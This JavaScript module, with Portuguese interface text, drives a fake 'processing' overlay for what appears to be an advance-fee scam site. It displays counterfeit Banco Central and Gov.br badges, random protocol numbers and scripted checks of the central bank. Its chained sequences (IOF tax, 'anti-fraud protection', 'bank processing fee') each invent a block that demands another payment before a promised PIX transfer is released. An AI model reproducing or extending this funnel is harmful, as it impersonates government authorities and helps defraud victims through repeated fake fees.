export class TransitionLoader {
  constructor() {
    this.overlay = null;
    this.messageElement = null;
    this.progressBar = null;
    this.iconElement = null;
    this.protocolElement = null;
    this.timestampElement = null;
    this.errorBox = null;
    this.currentMessageIndex = 0;
    this.messages = [];
    this.messageInterval = null;
    this.progressInterval = null;
    this.createOverlay();
  }

  createOverlay() {
    const overlay = document.createElement('div');
    overlay.className = 'transition-overlay';
    overlay.innerHTML = `
      <div class="transition-content">
        <div class="loader-icon-container">
          <div class="loader-spinner"></div>
          <i class="fas fa-shield-alt loader-icon"></i>
        </div>
        <h2 class="loader-title">Processando...</h2>
        <p class="loader-message">Aguarde enquanto processamos sua solicitação</p>
        <div class="loader-progress">
          <div class="loader-progress-bar"></div>
        </div>
        <div class="loader-protocol">Protocolo: #<span id="protocol-number"></span></div>
        <div class="loader-timestamp" id="timestamp"></div>
        <div class="loader-security-badges">
          <img src="images/bacen.png" alt="Banco Central" class="loader-security-badge">
          <img src="images/gov-br.webp" alt="Gov.br" class="loader-security-badge">
        </div>
        <div class="loader-error-box">
          <div class="loader-error-icon"><i class="fas fa-exclamation-triangle"></i></div>
          <div class="loader-error-title">Atenção</div>
          <div class="loader-error-message"></div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);
    this.overlay = overlay;
    this.messageElement = overlay.querySelector('.loader-message');
    this.progressBar = overlay.querySelector('.loader-progress-bar');
    this.iconElement = overlay.querySelector('.loader-icon');
    this.protocolElement = overlay.querySelector('#protocol-number');
    this.timestampElement = overlay.querySelector('#timestamp');
    this.errorBox = overlay.querySelector('.loader-error-box');
    this.titleElement = overlay.querySelector('.loader-title');

    this.generateProtocol();
    this.updateTimestamp();
  }

  generateProtocol() {
    const protocol = Math.floor(100000000 + Math.random() * 900000000);
    this.protocolElement.textContent = protocol;
  }

  updateTimestamp() {
    const now = new Date();
    const formatted = now.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
    this.timestampElement.textContent = formatted;
  }

  show(config = {}) {
    const {
      title = 'Processando...',
      messages = ['Aguarde enquanto processamos sua solicitação'],
      icon = 'fa-shield-alt',
      duration = 5000,
      messageInterval = 2000,
      errorMessage = null,
      errorTitle = 'Atenção',
      onComplete = null
    } = config;

    this.messages = messages;
    this.currentMessageIndex = 0;
    this.titleElement.textContent = title;
    this.iconElement.className = `fas ${icon} loader-icon`;
    this.errorBox.classList.remove('show');

    this.overlay.classList.add('active');

    this.updateMessage();
    this.startProgress(duration);

    if (messages.length > 1) {
      this.messageInterval = setInterval(() => {
        this.currentMessageIndex++;
        if (this.currentMessageIndex < this.messages.length) {
          this.updateMessage();
        }
      }, messageInterval);
    }

    setTimeout(() => {
      if (errorMessage) {
        this.showError(errorTitle, errorMessage);
        setTimeout(() => {
          if (onComplete) onComplete();
        }, 2500);
      } else {
        if (onComplete) onComplete();
      }
    }, duration);
  }

  updateMessage() {
    const newMessage = this.messages[this.currentMessageIndex];
    this.messageElement.style.animation = 'none';
    setTimeout(() => {
      this.messageElement.textContent = newMessage;
      this.messageElement.style.animation = 'fadeInMessage 0.5s ease';
    }, 50);
  }

  startProgress(duration) {
    const steps = 100;
    const stepDuration = duration / steps;
    let currentProgress = 0;

    this.progressInterval = setInterval(() => {
      currentProgress += 1;
      this.progressBar.style.width = `${currentProgress}%`;

      if (currentProgress >= 100) {
        clearInterval(this.progressInterval);
      }
    }, stepDuration);
  }

  showError(title, message) {
    this.iconElement.className = 'fas fa-exclamation-triangle loader-icon error';
    const errorTitleEl = this.errorBox.querySelector('.loader-error-title');
    const errorMessageEl = this.errorBox.querySelector('.loader-error-message');

    errorTitleEl.textContent = title;
    errorMessageEl.textContent = message;
    this.errorBox.classList.add('show');
  }

  hide() {
    if (this.messageInterval) {
      clearInterval(this.messageInterval);
    }
    if (this.progressInterval) {
      clearInterval(this.progressInterval);
    }

    this.overlay.classList.remove('active');
  }

  destroy() {
    this.hide();
    setTimeout(() => {
      if (this.overlay && this.overlay.parentNode) {
        this.overlay.parentNode.removeChild(this.overlay);
      }
    }, 500);
  }
}

export const transitionSequences = {
  pagamentoToIof: {
    title: 'Confirmando Pagamento',
    icon: 'fa-check-circle',
    messages: [
      'Validando transação PIX...',
      'Consultando Banco Central...',
      'Verificando pendências fiscais...',
      'Analisando requisitos legais...'
    ],
    duration: 5500,
    messageInterval: 1400,
    errorTitle: 'Imposto Obrigatório Detectado',
    errorMessage: 'IOF (Imposto sobre Operações Financeiras) deve ser pago conforme Lei nº 8.894/94'
  },

  iofToOferta: {
    title: 'Processando IOF',
    icon: 'fa-file-invoice-dollar',
    messages: [
      'Confirmando pagamento do IOF...',
      'Atualizando saldo disponível...',
      'Calculando prazo de liberação...',
      'Gerando comprovante...'
    ],
    duration: 5000,
    messageInterval: 1250,
    errorTitle: null,
    errorMessage: null
  },

  upsell1ToUpsell2: {
    title: 'Processando Taxa',
    icon: 'fa-sync-alt',
    messages: [
      'Validando taxa de antecipação...',
      'Consultando dados bancários...',
      'Verificando limites disponíveis...',
      'Analisando segurança da transação...'
    ],
    duration: 5200,
    messageInterval: 1300,
    errorTitle: 'Proteção Anti-Fraude Requerida',
    errorMessage: 'É necessário validar a segurança da transação antes de prosseguir'
  },

  upsell2ToUpsell3: {
    title: 'Liberando Transferência',
    icon: 'fa-exchange-alt',
    messages: [
      'Validando pagamento de segurança...',
      'Consultando sistema do Banco Central...',
      'Processando liberação de saldo...',
      'Iniciando transferência PIX...'
    ],
    duration: 6000,
    messageInterval: 1500,
    errorTitle: 'Transferência Bloqueada',
    errorMessage: 'Tarifa de processamento bancário identificada. Pagamento necessário para liberação'
  },

  upsell3ToTarifa: {
    title: 'Finalizando Processo',
    icon: 'fa-clock',
    messages: [
      'Confirmando última taxa...',
      'Desbloqueando transferência...',
      'Preparando envio para sua chave PIX...',
      'Calculando tempo de processamento...'
    ],
    duration: 5500,
    messageInterval: 1375,
    errorTitle: 'Prazo de Processamento',
    errorMessage: 'Transferência será processada em até 3 dias úteis'
  }
};

export function showTransition(sequenceName, onComplete) {
  const sequence = transitionSequences[sequenceName];
  if (!sequence) {
    console.error(`Sequência "${sequenceName}" não encontrada`);
    if (onComplete) onComplete();
    return;
  }

  const loader = new TransitionLoader();
  loader.show({
    ...sequence,
    onComplete: () => {
      if (onComplete) onComplete();
      setTimeout(() => loader.destroy(), 500);
    }
  });
}
